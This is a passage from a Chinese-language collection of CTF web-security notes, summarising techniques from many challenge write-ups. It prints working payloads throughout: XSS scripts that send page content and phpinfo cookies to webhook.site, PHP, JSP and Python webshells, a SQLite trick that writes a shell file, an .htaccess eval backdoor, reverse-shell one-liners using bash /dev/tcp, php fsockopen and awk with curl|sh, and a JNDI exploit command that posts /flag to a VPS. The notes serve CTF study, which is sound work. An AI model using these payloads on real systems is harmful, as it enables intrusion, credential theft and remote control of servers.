        document.location= `https://webhook.site/645c6365-01c7-4535-a172-a9014e389741?c=${w.document.body.innerHTML}`
    },500);
</script>
```

例题:[california-state-police](https://blog.jaquiez.dev/Blog/LACTF2023/#CSP)。能成功的原因在于：根据[MDN文档](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)，window.open会在目标的环境（context）打开一个空白窗口，意味着同域内的内容可用js访问。

该题的另外一种[做法](https://hackmd.io/@lamchcl/r1zQkbvpj#cryptohill-easy)思路差不多，不过用了两个report：

```html
<script>
setTimeout(()=>{location="https://webhook.site/ac78b7a4-1e35-4fd9-ac25-83a47c4ecf09?a="+encodeURIComponent(window.opener.document.documentElement.outerHTML)},200)
</script>
```

```html
<form action="/flag" method=POST></form>
<script>
window.open("/report/11da7ab4-821d-4f2f-8ea1-e829d74a6366", target="_blank")
document.forms[0].submit();
</script>
```

后者是提交给admin bot的report。发现主要思路还是利用form访问flag然后利用打开的另一个窗口将内容带出来。

如果非要在开启HttpOnly的情况下获取cookie，在php驱动的网站下，尝试找phpinfo界面，里面有个HTTP_COOKIE字段。xss让bot访问phpinfo界面，找HTTP_COOKIE字段就能拿到cookie了。脚本参考：

```html
<script>
fetch('/phpinfo.php', {
method: 'POST'})
.then((response) => response.text())
.then((data) => fetch('webhook之类网址', {
method: 'POST',body:btoa(data)}));
</script>
```

141. js中的type juggling。审查源码时，可能会发现服务器期望输入变量是字符串等简单类型，但如果没有对变量做严格过滤，或是使用了express的`express.urlencoded()`（其extended属性默认接受复杂类型），就可以尝试攻击，比如改成数组之类的。例题:[queue up!](https://github.com/sambrow/ctf-writeups/blob/main/2023/la-ctf/queue-up.md)
142. 当xss代码以innerHTML形式插入时，浏览器不会执行这样的代码。可以用`<img/src=1 onerror=function()>`或`<iframe>`替代。`<iframe>`有个srcdoc属性，里面的内容会被当作html执行。这种解法可在[这里](https://hackmd.io/@lamchcl/r1zQkbvpj#webhptla)找到。
143. js的多行注释/\*\*/可用于绕过滤和跨多行执行xss，不过要注意，多行注释不要用在js关键字中间，例如`win/**/dow`。因为js会把/\*\*/解释为空格，window就失效了。例题:[hptla](https://blog.jaquiez.dev/Blog/LACTF2023/#hptla)
144. typescript+ssrf。例题:[[2021祥云杯]secrets_of_admin](https://blog.csdn.net/weixin_46081055/article/details/123959252)。此题的知识点：

- 下面这个路由：

```ts
router.get('/api/files/:id'...)
```

当我们访问`http://xxx.com/api/files/aaa`时，aaa就是id的值。
- 利用\<img\>标签的src属性触发ssrf。\<img\>标签会加载src指定的资源，如果我们往src里输入想要ssrf的目标网址，自然就是用当前服务器的身份构造了一次ssrf了。其他有类似属性的标签也可以这么用。当然，对应网址需要被加载，这题里面触发场景为html转pdf时加载图片资源。
- `content.includes('<')`可以用数组类型的`content[]`绕过。
- http-pdf 任意文件读取漏洞。可以用XHR（XMLHttpRequest）任意文件读取。
- ts开放在8888端口。
- 当看到`filename   VARCHAR(255) NOT NULL UNIQUE`的数据库配置,说明filename这个字段值不能重复。这道题的解决方法是构造垃圾目录（flag已有，构造./flag，由于路径字符串拼接，没有影响）。

145. mysql查询特性。

- 不分大小写/多余空格。下面的代码：

```php
$username=mysqli_real_escape_string($conn,$_GET['username']);
$password=mysqli_real_escape_string($conn,$_GET['password']);
if ($username=="admin" && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admins login are allowed locally only");
}
else
{
    //查询逻辑，用户名和密码为admin/admin，查得出来就给flag
}
```

可以用`http://xxx.com?username=Admin&password=admin`来绕过。就算填写的用户名是Admin，依然能查询出来admin的数据。另一种绕过方式是`http://xxx.com?username=admin &password=admin`，多了个空格。
- 默认将unicode字符转为字母。

```php
$username=mysqli_real_escape_string($conn,$_GET['username']);
$password=mysqli_real_escape_string($conn,$_GET['password']);
if (preg_match("/admin/i",$username) && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admins login are allowed locally only");
}
else
{
    //查询逻辑，用户名和密码为admin/admin，查得出来就给flag
}
```

可以用`?username=Àdmin&password=admin`绕过。这里使用的`À`会被标准化成A，不影响查询结果，但可以绕过正则。另外，这道题还告诉我`$_SERVER['REMOTE_ADDR']!=="127.0.0.1"`是不可绕过的。

146. 上传图片的xss挑战可以考虑上传svg类型（svg图片存在`<script>`标签，可以插入xss代码）。
147. 如果服务器返回的报文没有`Content-Type`字段，浏览器就需要强制解析返回的内容，借此可以执行一些恶意代码（比如上传图片，但是内容是xss。如果此时服务器不返回images/png的`Content-Type`，浏览器就要解析图片，执行xss）。对于apache服务器，当文件名不存在后缀时，它不会返回`Content-Type`字段。这些文件名有`.png`,`.jpg`甚至`...png`（任意数量的点）。
148. [DomPurify.sanitize](https://cloud.tencent.com/developer/article/1825938)过滤下的xss。sanitize只允许创建`[div,a,span,p]`html标签和属性`[style,id,name,href]`，这种情况下在没有用户交互的前提下是不可能成功执行有用的xss的。不过既然开放了一些标签，可以考虑[dom clobbering](https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)。例如在插入`<p id='test'>`这个标签后，在js里可以通过`test`或者`window.test`来获取到它。这意味着：

```js
if(user.isAdmin){
    //期望执行逻辑
}
```

这样的代码可以通过创建`"<a/id='user'><a/id='user'/name=isAdmin>"@g.com`来覆盖原本的`user.isAdmin`，使其进入if语句（这里payload的`/`和`@g.com`是因为题目要求输入内容为邮箱，加入`/`代替空格使其符合邮箱格式）。注意无需给其赋值，让它存在并覆盖原来的就行。

145. 绕过getimagesize（将js代码插入有效图片）+绕过csp `script-src 'self'`。可直接使用这篇[文章](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)的poc图片，hex editor打开图片找到`alert`代码即可将其换为任意其他js代码。
146. php的include函数包含木马时，木马文件的后缀名无需是php，jpg等也行，只要图片文件里包含php木马代码。可以考虑用exiftool把木马写到注释里：`exiftool img.jpg -Comment="<?=system(\$_GET[0]);die();?>"`。
147. php [realpath](https://www.php.net/manual/zh/function.realpath.php)函数在参数路径开头为`file:///`时，会返回空字符串。
148. sqlite利用查询语句写入php shell文件。要注意ATTACH DATABASE的路径需要可读可写。

```sql
ATTACH DATABASE '/var/www/html/socengexpasdf.php' AS socengexpasdf;
CREATE TABLE socengexpasdf.pwn (dataz text);
INSERT INTO socengexpasdf.pwn VALUES ('<? system($_GET["cmd"]); ?>');
```

[ATTACH DATABASE](https://www.runoob.com/sqlite/sqlite-attach-database.html)附加数据库`/var/www/html/socengexpasdf.php`，因为该文件不存在，故会在/var/www/html/下创建一个socengexpasdf.php，别名为socengexpasdf，下面的语句都是基于别名来操作的。[CREATE TABLE](https://www.runoob.com/sqlite/sqlite-create-table.html)在刚才指定的socengexpasdf数据库下创建一个名为pwn的表，(dataz text)指定数据类型。[INSERT INTO](https://www.runoob.com/sqlite/sqlite-insert.html)插入shell代码。

149. 根据查询结果重定向不同的url的设计加上不安全的cookie设置（SameSite: None;Secure: false:）可能有[XS-leak](https://xsleaks.dev/)。例题:[secrets](../../../../CTF/HackTM%20CTF/Web/secrets.md)，此题的预期解为[Cross-Origin Redirects and CSP Violations](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)，非预期解则是利用了chrome的url大小最大为2MB的限制。
150. 利用sql [like](https://www.runoob.com/sql/sql-like.html)语句爆破code+利用BeautifulSoup与浏览器解析html的区别绕过xss过滤+利用www.youtube.com的[JSONP](https://www.zhihu.com/question/19966531)绕过CSP限制。例题:[Crocodilu](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu)。题目要求激活用户需要输入code，但code是4位随机数字且一个邮箱账号因为[redis](https://zhuanlan.zhihu.com/p/51608696)的限制只允许爆破一次。漏洞代码为下面的sql语句：

```sql
SELECT * FROM users WHERE email LIKE "email" AND code LIKE "code"
```

且邮箱验证代码使用了python的re.match：

- If zero or more characters at the beginning of string match the regular expression pattern, return a corresponding match object. Return None if the string does not match the pattern; note that this is different from a zero-length match. 

允许我们在正确格式的邮箱末尾添加sql里的通配符%。只要我们在输入邮箱时基于原来的邮箱不停在末尾添加%，redis不会将其识别为同一个邮箱，但sql查询时会，成功绕过一个邮箱账号只能爆破一次的难题。

关于BeautifulSoup，对于下面的结构：

```html
<!--><script>alert(1)</script>-->
```

BeautifulSoup会将其解析为注释，但浏览器会将其解析为script，成功执行代码。

151. 利用jQuery load函数的特性执行xss。例题:[Hades](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/hades)。此题的关键代码在于：

```js
$('#ajax-load').load('/ajax/articles?cat=news');
```

其中news可控。如果我们构造paylaod:`/ajax/articles?cat=asdf"x="`，服务器会返回：

```html
<noscript>
    If you can't see anything, you have to enable javascript
    <img src="/images/error.jpg" alt="selected category asdf"x="" />
</noscript>
```

给img注入了一个属性，但是因为[<noscript>](https://www.runoob.com/tags/tag-noscript.html)标签的存在，无法执行xss。于是根据jQuery[文档](https://api.jquery.com/load/)，利用load函数的提取标签特性成功盗取cookie。

152. flask session密钥爆破工具：[flask-unsign](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign)。例题:[Chocholates](https://eszfrigyes.com/2023/02/ctf-writeup-chocolates-mhsctf2023/)
153. 智能合约（[solidity](https://docs.soliditylang.org/en/v0.8.17/index.html)语言）初探。例题:[Guess The Name](https://github.com/skabdulhaq/CTF-learnings/blob/main/CTF-writeups/BytesbanditCTF/blockchain-GuessTheName.md)。此题代码很简单，解法是自己写另一个合约，内部根据Challenge合约里已有的接口重写方法，使其返回True；然后连上题目提供的Challenge合约，使用[msg.sender](https://stackoverflow.com/questions/48562483/solidity-basics-what-msg-sender-stands-for)地址[释放](https://www.web3.university/tracks/create-a-smart-contract/deploy-your-first-smart-contract)刚才的写的合约。Challenge合约调用重写的函数，获取flag。

在[ctf wiki](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)看见了msg.sender的详细解释。msg.sender 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。给定这样一个场景，如用户通过合约 A 调合约 B，此时对于合约 A : msg.sender 是用户；对于合约 B : msg.sender 是合约 A

154. [Tor](https://zh.wikipedia.org/zh-cn/Tor)可以访问以onion结尾的网站。例题:[Hash Browns](https://medium.com/@vj35.cool/the-bytebandits-ctf-2023-449a2d64c7b4)
155. onERC721Received回调函数可能触发[Re-Entrancy Attack](https://steemit.com/cn/@chenlocus/reentrancy)（重入攻击，特征为先操作后改状态）+js/python释放合约。例题:[Dragon Slayer](../../CTF/HackTM%20CTF/Web/Dragon%20Slayer.md)。
156. [zero-trust](https://github.com/5t0n3/ctf-writeups/blob/main/2023-lactf/web/zero-trust/README.md)
- AES-256-[GCM](https://zh.wikipedia.org/wiki/%E4%BC%BD%E7%BD%97%E7%93%A6/%E8%AE%A1%E6%95%B0%E5%99%A8%E6%A8%A1%E5%BC%8F)(带认证的AES加密)正确使用可防止密文篡改，此题演示了一种错误使用方式：使用decipher.setAuthTag()后却不使用decipher.final()（参考Node.js的[Crypto](https://nodejs.org/api/crypto.html#decipherfinaloutputencoding)模块）。setAuthTag()函数设置一个tag，在最后使用final函数时如果没有提供一样的tag或者密文被篡改，就会报错。
- AES-256-GCM按128位分块。这题已知部分密文对应的明文，就可以用明文异或密文获取部分加密时的key。此时就能用这小部分key篡改密文了。
157. [evmvm](../../CTF/LA%20CTF/Web/evmvm.md).
- EVM虚拟机[opcode](https://www.evm.codes/?fork=merge)
- solidity [assembly](https://docs.soliditylang.org/en/v0.8.19/assembly.html)内部的语言是[yul](https://docs.soliditylang.org/en/v0.8.17/yul.html)。
- [GAS](https://zhuanlan.zhihu.com/p/34960267)，[calldata](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/f958b119-5a8d-4050-ad68-6422d10a7655.xhtml)和[function selector](https://solidity-by-example.org/function-selector/)等概念
158. [sqlite注入](https://juejin.cn/post/7016991806759911454)。sqlite的语法大部分和sql差不多，不过注释符是`--`,`;`,`/*`。
159. JWT不仅可以被存储在Cookie里，也可以被存在浏览器的Local Storage里。
160. [RPS](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/RPS/writeup.md)（另一版本[wp](https://sichej.it/writeups/rps-writeup/)）
- [plain input(text) fields](https://stackoverflow.com/questions/56843356/plain-text-field-validation-for-protection-against-xss-attack)路由可能会成为xss的潜在攻击对象。或者说，当题目明确提示要成为admin+有机器人/管理员会查看xxx等提示时，就要考虑xss了。管理员要查看的xxx就是需要特别关注的地方。
- 同样的xss更改邮箱（可以换成任何其他题目的路由）payload，既可以用fetch：

```js
<script>
    fetch("https://rps.ctf.pragyan.org/email", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        credentials: "include",
        body: "newEmail=youremail%40gmail.com",
    });
</script>
```

也可以用XMLHttpRequest：

```js
<script> const xhr = new XMLHttpRequest(); xhr.open('POST', '{URL}/email');xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify({newEmail: "your_email_here"})); </script>
```

161. [Quotify](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/Quotify/writeup.md)
- JSONP路由callback的利用
- [mXss](https://security.stackexchange.com/questions/46836/what-is-mutation-xss-mxss)（mutaion Xss，突变xss）+DOM Clobbering

介绍mXss的[视频](https://www.youtube.com/watch?v=Haum9UpIQzU)(16:00开始)。内容可以简述为这篇[帖子](https://juejin.cn/post/6844903571578699790)的内容。这道题使用的mXss可能更像[这种](https://xz.aliyun.com/t/6413)。这道题需要利用JSONP调用一个函数，但这个函数有一些限制。因为输入的内容会被放入div标签中，于是用mXss使dom变异，多出来的结构刚好可以提供给DOM Clobbering。

162. [Proxy It](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/ProxyIt/writeup.md)。利用[request smuggling](https://portswigger.net/web-security/request-smuggling)（请求走私）访问被禁止的路径。
163. [Pages of Turmoil](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/PagesOfTurmoil/writeup.md)。
- 利用Chrome的[Text Fragments](https://developer.mozilla.org/en-US/docs/Web/Text_fragments)控制页面高亮、翻页到特定位置。
- MongoDB [ObjectId](https://www.mongodb.com/docs/manual/reference/method/ObjectId/)格式。
164. [Lerdof's Records](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/Lerdof's%20Records/writeup.md)
- php的strcmp()只会对比null字节之前的字符，但strlen函数计算字符串长度是包含null字节

补充：当strcmp的参数是数组时，会抛出warning且返回true，故可绕过。例如下方代码：

```php
<?php
    $flag="";
    try {
        if (isset($_GET['username']) && isset($_GET['password'])) {
            if (strcmp($_GET['username'], $flag)==0 && strcmp($_GET['password'], $flag)==0)
                echo $flag;
            els
                echo "Invalid username or password";
        }
    } catch (Throwable $th) {
        echo $flag;
    }
?>
```

可用`https://xxx.com/?username=a&password[0]=b`绕过。一般情况直接传数组就行，有的时候需要数组里赋值。也可用`https://xxx.com/username=aaa&password[]=[]`

- php[序列化字符串](https://www.neatstudio.com/show-161-1.shtml)利用引用符号R绕过`secret1 === secret2`。
165. [Christmas Heist](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/ChristmasHeist/writeup.md)
- 一个代表windows95的User-agent：`Opera/9.80 (Windows 95) Presto/2.12.388 Version/12.13`
- 一个来自土耳其的ip：`31.143.76.255`
- [hashcat](https://github.com/hashcat/hashcat)爆破jwt密钥:`hashcat -a0 -m 16500 jwt.hash rockyou.txt --show`。其中jwt.hash为要爆破的jwt值。
167. [Restricted Access](https://deyixtan.github.io/posts/wxmctf2023/web2-restricted-access/)
- [http](https://developer.mozilla.org/en-US/docs/Web/HTTP)报文头（header）相关内容。
- User-Agent指定使用的设备
- Referer指定来自何处。题目这里给的提示是maclyonsden.com，实际要加的却是`Referer: https://maclyonsden.com/`。注意多试。
- Date指定访问日期。
- 将Upgrade-Insecure-Requests的值设为1可指定服务器返回加密的安全回复。
- 网速/网络相关：Downlink，ECT或RTT。
168. [NFTs](https://deyixtan.github.io/posts/wxmctf2023/web3-nfts/)
- python无限制/任意文件上传（[Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)）+文件存储路径拼接文件名导致的文件覆盖。
- 此题可以上传任意名字的任意文件，且文件名经过拼接存储。那么就可以上传`../app.py`覆盖原本flask的app.py，使其返回flag。
169. [Brawl: Shopping Spree](https://deyixtan.github.io/posts/wxmctf2023/web4-brawl-shopping-spree/)
- sqlite union联合注入（要注入的表名已知）。
  - > 测试语句：`' UNION SELECT 1,2,3,4,5 FROM skins WHERE '1' = '1`。
  - > 从sqlite_master表中找出指定表的结构：`' UNION SELECT sql,1,1,1,1 FROM sqlite_master WHERE name='secretskins`(表名secretskins需要已知)
  - > 查询出值：`' UNION SELECT skinid,description,image,1,1 as name FROM secretskins WHERE '1' = '1`.
170. [OURspace](https://deyixtan.github.io/posts/wxmctf2023/web5-ourspace/)
- 使用js代码创建form绕过CSP `script-src 'none'`执行xss
```js
const form = document.createElement("form");
const username = document.createElement("input");
const password = document.createElement("input");
username.name = "username";
username.value = "1";
password.name = "password";
password.value = "1";
form.method = "POST"
form.action = "http://127.0.0.1:3000/login";
form.appendChild(username);
form.appendChild(password);
document.getElementsByTagName("body")[0].appendChild(form);
form.submit();
//或者
javascript:{
var form = document.createElement("form");
form.method = "POST";
form.action = "http://127.0.0.1:3000/login";
var element1 = document.createElement("input"); 
var element2 = document.createElement("input");  
element1.value="123456";
element1.name="username";
form.appendChild(element1);  
element2.value="123456";
element2.name="password";
form.appendChild(element2);
document.body.appendChild(form);
form.submit();
}
```
-  绕过`<p style="display: none;">`标签，使标签内的内容显现出来。此题由于会在p标签前直接插入用户可控制内容，导致可以构造另一个未闭合的标签p(`<p name="`)来吞掉目标标签p的`display: none;`属性。或是设置style标签：
```html
<style>
p {
display: inline !important; /* https://developer.mozilla.org/en-US/docs/Web/CSS/important */
margin-top: -24rem;
position: absolute;
}
</style>
```

`!important`的优先级比`display: none;`高，高亮标签内的内容。

171. 使用ngrok转发tcp端口,实现反弹远程shell。[How to catch a Reverse shell over the Internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)。
```
ngrok tcp 7777
//另一个终端窗口监听指定tcp端口
nc -lv 7777
```
172. [[网鼎杯 2020 青龙组]filejava](http://www.xianxianlabs.com/blog/2020/06/02/377.html)
- 路径穿越导致任意文件下载漏洞。因为是java题，所以根据[Java web应用目录结构](https://www.qikegu.com/docs/1424)，下载WEB-INF里面的web.xml，获取所有的类源码文件。
- poi-ooxml-3.10（一个处理word文档，excel文件的组件）的excel-xxe漏洞：[CVE-2014-3529](https://xz.aliyun.com/t/6996)利用。
173. git文件夹泄露后的版本回退。题目提示flag在git的旧版本里，且可获得完整.git目录。首先用[GitHacker](https://github.com/WangYihang/GitHacker)获取.git目录，然后进行[版本回退](https://www.liaoxuefeng.com/wiki/896043488029600/897013573512192)：`git reset --hard HEAD^`。
174. 绕过302重定向（[bypass 302 redirect](https://gostart.biz/en/how-to-bypass-a-302-redirect/)）。其中一个方法是用curl访问目标网址。
175. ip的两种表示[方式](https://blog.csdn.net/xiaolong_4_2/article/details/80857941)。
176. [msfroggenerator2](../../CTF/picoCTF/Web/msfroggenerator2.md)
- [docker-compose.yml](https://docs.docker.com/compose/compose-file/compose-file-v3/)，[nginx配置文件](https://www.cnblogs.com/54chensongxia/p/12938929.html)和[traefik](https://doc.traefik.io/traefik/routing/overview/)了解。
- js里的searchParams.get可以遍历，有可能存在列表参数，也就是多个 value 一个 key 。而Object.fromEntries 会把多个压缩成一个，并且总是取得最后面的那个。即连续给相同参数附不同值时，只会取到最后面的那个。
- nginx里的&是保留词，如果放在开头就会被nginx 当作另一个参数对待，不会读取。且无法用其url编码形式绕过，因为此题使用ngx.var.arg_xx读取请求的参数，而ngx.var.arg_xx在获取的时候不会进行 urldecode。
- Traefik 2.7.2+会自动将url里的`;`替换为`&`，可能有query参数覆盖。
- chrome puppteer不仅可以访问普通的url，还可以访问`javascript:代码`,`file:///`等协议。并且还可以使用正常浏览器的保存文件等功能。
- chrome对于file scheme有严格的保护机制。对于 fetch 等直接获取信息的东西，无法跨域。并且 file 处于特殊的地方，它和 data 一样都是以 null 作为 origin 并且不能互相访问。如果外部访问 file 的内容会被 chrome 阻止。也就是说，不能用任何 file 之外的东西直接获取 file 的内容，连 open 和 iframe 都不能访问到 file。但file 访问 file 的时候是不受这个限制的。需要注意的是从 file 访问 file 的时候，不能用跨域直接获取信息的方法，例如 fetch 和 open 的返回对象。但是 open 和 iframe 是可以正常用的。
- chrome似乎允许puppeteer的`page.goto`(等于用户在浏览器输入url)执行xss，不管csp。
177. [web签到](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh#BEM2dgiACoGmg4x4jKXcJ6kGnQf)
- php中的数组可以直接赋值：
```php
$a[1][2][3][4]='b';
echo $a[1][2][3][4];
//输出b
```
- 如cookie名/内容带中文，需要转换编码再发送。
```python
cookie={"测试:".encode('utf-8').decode("latin-1"):'a'}
```
178. 下面的代码可以用+连接绕过。

```php
<?php
highlight_file(__FILE__); 
include "flag.php";  
if (isset($_GET['num'])){
     if ($_GET['num'] == 114514 && check($_GET['num'])){
              assert("intval($_GET[num])==1919810") or die());
              echo $flag;
     } 
} 

function check($str){
  return !preg_match("/[a-z]|\;|\(|\)/",$str);
}
//payload:?num=114514%2b1805296
```
179. 假设只能使用长度为3个字符以内的命令，但参数不限制，就可以用[awk](https://wangchujiang.com/linux-command/c/awk.html)命令反弹shell。`awk '{system("curl https://your-shell.com/ip:port|sh")}'`
180. php也有整型溢出。例题:[茶歇区](https://blog.csdn.net/miuzzx/article/details/127830557#t16)
181. AES的ECB模式下，一组密文对应一组明文，也就是说，可以通过改变密文的顺序从而改变解密后明文的顺序。甚至说，可以自己移除某一段密文，只要解密后的明文有效就行。例题:[龙珠NFT](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh)
182. php环境下的反弹shell（reverse shell）命令。`php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'`.
183. [被遗忘的反序列化](https://blog.csdn.net/qq_63928796/article/details/129968742#t1)
- php反序列化漏洞。
- `$_SERVER["HTTP_AAAAAA"]`表示请求header中`aaaaaa`字段的值。
- [php原生类利用](https://www.anquanke.com/post/id/264823)：GlobIterator通过模式匹配遍历文件目录；SplFileObject读取指定文件内容。注意SplFileObject读取文件时是一行一行读的，所以直接`echo new SplFileObject(path)`只会出第一行的内容。似乎用伪协议就没有这个问题。
184. python一句话木马：`__import__("os").popen("ls").read()`。
185. [easy_php](https://blog.csdn.net/m0_64815693/article/details/130038356)
- 使用C（custom object，类名类型）+ArrayObject（Serializable接口）绕过格式化字符串`/^[Oa]:[\d]+/i`过滤。注意此法无法绕过__wakeup。
- 单纯C可以绕过__wakeup。O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会被自动调用。但这种方法不能有属性，那么只能触发__construct和__destruct。
- 不过有C在的情况，会先检测这里类是否实现了Serializable接口。如果有的话，会将里面的值传入重写的unserialize方法。这是可以正常解析的，所以可以通过利用实现了Serializable接口的原生类，来解析正常解析里面的那一串。ArrayObject正是其中之一。
186. linux终端bash反弹shell命令。`bash -c "bash -l > /dev/tcp/IP/PORT 0<&1 2>&1"`
187. linux系统下的flag可能藏在环境变量中。可用`env`或`printenv`命令查看环境变量。
188. [babycat](https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat)
- java网站任意文件读取（读取WEB-INF/web.xml获取网站结构并读取源码）
- jsp一句话木马。
```jsp
<% if("a".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
```

请求：`http://x.x.x.x/cmd.jsp?pwd=b&i=ls`
- json解析特性：JSON 中的内联注释不会影响其解析。如`{"username":"LemonPrefect","password":"pass","role":"superUserLemonPrefect","role"/**/:"admin"}`或`{"username":"LemonPrefect","password":"pass","role":"admin"/*,"role":"guest"*/}`。前者`"role"/**/:"admin"`会正常解析，后者`/*,"role":"guest"*/`不会解析（解析出来role是admin）
189. [[JMCTF 2021]UploadHub](https://blog.csdn.net/weixin_45669205/article/details/117047432)
- php任意文件上传：上传.htaccess改变网站配置。
- apache2.conf配置文件中：

```conf
<Directory ~ "/var/www/html/upload/[a-f0-9]{32}/">
        php_flag engine off
</Directory>
```

`php_flag engine off`设置会让整个目录不解析php，导致上传的php木马无效。
- .htaccess修改网站配置使其解析php。
```
<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
</FilesMatch>

php_value auto_prepend_file .htaccess
#<?php eval($_POST['a']);?>
```

其中：
```
ForceType application/x-httpd-php
SetHandler application/x-httpd-php
```
强制所有匹配的文件被一个指定的处理器处理,这里为php。
```
Require all granted  #允许所有请求
php_flag engine on   #开启PHP的解析
php_value auto_prepend_file .htaccess 在主文件解析之前自动解析包含.htaccess的内容
```
- .htaccess文件的盲注。
```
<If "file('/flag')=~ '/flag{/'">
ErrorDocument 404 "wupco"
</If>
```
`~`用于开启“正则表达式”分析，正则表达式必须在双引号之间。如果匹配到flag就设置ErrorDocument 404为"wupco"。可以将中间的`flag{`一个字符一个字符地试错匹配，通过回显判断是否正确，即盲注。

190. md5截断多线程爆破脚本。

```python
#substr(md5(captcha), -6, 6) == "5e1df8"
import hashlib
from multiprocessing.dummy import Pool as ThreadPool 
def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()
keymd5 = '5e1df8'  # 已知的md5截断值
md5start = -6  # 设置题目已知的截断位置
def findmd5(sss):  # 输入范围 里面会进行md5测试
    key = sss.split(':')
    start = int(key[0])  # 开始位置
    end = int(key[1])  # 结束位置
    result = 0
    for i in range(start, end):
        if md5(i)[md5start:] == keymd5:
            result = i
            print(result)  # 打印
            break
list = []  # 参数列表
for i in range(1):  # 多线程的数字列表 开始与结尾.range里的数字表示爆破范围的线程数量
    list.append(str(10000000 * i) + ':' + str(10000000 * (i + 1)))
pool = ThreadPool()  # 多线程任务
pool.map(findmd5, list)  # 函数 与参数列表
pool.close()
pool.join()
```
192. [[BSidesCF 2019]Mixer](https://blog.csdn.net/weixin_44037296/article/details/112370510)
- AES ECB加密内容识别：修改密文的开头几个字节不影响末尾密文的解密（反之也成立，修改密文末尾的字节不影响开头明文的解密）。与CBC模式不同，CBC中修改前段密文解密出来的明文全部都会是乱码。
- ECB加密是16位一组，每组相互独立，加密后每组为32位。
- 在json中1.00 == 1（小数点后几个0都没问题）。
193. [[红明谷CTF 2021]JavaWeb](https://blog.csdn.net/Mrs_H/article/details/124035038)
- Apache [shiro](https://zhuanlan.zhihu.com/p/54176956)框架[判断](https://blog.csdn.net/qq_38154820/article/details/106726691)：可在 cookie 追加一个`rememberMe=xx`的字段，这个字段是rememberMeManager默认的。然后看响应头部可以看看是否有`Set-Cookie:rememberMe=deleteMe; `的字段。若有则是shiro框架。
- CVE-2020-11989,[Apache Shiro权限绕过](https://www.anquanke.com/post/id/222489)：当遇到无法访问的url（直接访问会重定向），可以考虑（假设要访问的url为/json）：
    - /;/json
    - url二次编码
- [jackson反序列化漏洞](https://b1ue.cn/archives/189.html)利用[工具](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)命令:`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl [VPS_IP:PORT] -File=@/flag' -A "[VPS_IP]"`。命令成功执行后复制工具给出的符合要求的rmi地址，使用CVE-2019-14439(springboot)的链子：`["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation": "rmi://地址"}]`。需要公网ip。
194. [[FBCTF2019]Products Manager](https://www.cnblogs.com/wkzb/p/12286303.html)
- mysql中的字符串比较。数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[String]和字符串B:[String2]进行比较时，假设String2比String多了一个字符串，这时MySQL会将字符串A填充为[String ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。如下两条查询语句：`select * from users where username='Dumb'`和`select * from users where username='Dumb '`。它们的查询结果是一致的，即第二条查询语句中Dumb后面的空格并没有对查询有任何影响。因为在MySQL把查询语句里的username和数据库里的username值进行比较时，它们就是一个字符串的比较操作，符合上述特征。
- insert截断。当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。
- 利用上述两个特点，当我们想获取Dumb身份却又不知道其密码时，可以注册一个名为`Dumb         xx`的用户。添加的空格数取决于数据库需要多少字符才会截断，末尾添上任意字符，防止出现用户名已存在。在后面登录时，假设登录代码如下：

```php
<?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT username FROM users
WHERE username='$username'
AND password='$password' ";
$res = mysql_query($query, $database);
if($res) {
    if(mysql_num_rows($res) > 0){
        return $username;
    }
}
return Null;
?>
```

填入我们注册的`Dumb         xx`和密码是可以查出结果的。虽然用户信息是我们自己的，但查出的用户名是Dumb。如果后续使用用户名而不是用户信息进行逻辑处理，我们就完成了一次越权。

195. [[HCTF 2018]Hideandseek](https://www.cnblogs.com/Yhck/p/13644349.html)
